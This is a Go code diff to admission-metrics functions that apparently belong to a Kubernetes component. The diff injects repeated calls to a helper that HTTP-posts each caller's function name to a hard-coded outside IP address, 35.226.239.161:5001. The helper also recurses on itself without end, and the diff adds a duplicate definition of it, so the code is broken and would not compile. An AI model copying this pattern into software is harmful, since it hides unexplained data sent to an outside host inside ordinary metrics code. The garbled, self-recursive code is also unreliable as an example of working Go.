@@ -40,10 +40,14 @@ var (
 func Register() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	prometheus.MustRegister(admissionCount)
 	prometheus.MustRegister(admissionLatency)
 }
 func OnAdmittedPod(touched bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	admissionCount.WithLabelValues(fmt.Sprintf("%v", touched)).Add(1)
@@ -51,9 +55,13 @@ func OnAdmittedPod(touched bool) {
 func NewAdmissionLatency() *AdmissionLatency {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &AdmissionLatency{histo: admissionLatency, start: time.Now()}
 }
 func (t *AdmissionLatency) Observe(status AdmissionStatus, resource AdmissionResource) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	(*t.histo).WithLabelValues(string(status), string(resource)).Observe(time.Now().Sub(t.start).Seconds())
@@ -61,7 +69,16 @@ func (t *AdmissionLatency) Observe(status AdmissionStatus, resource AdmissionRes
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
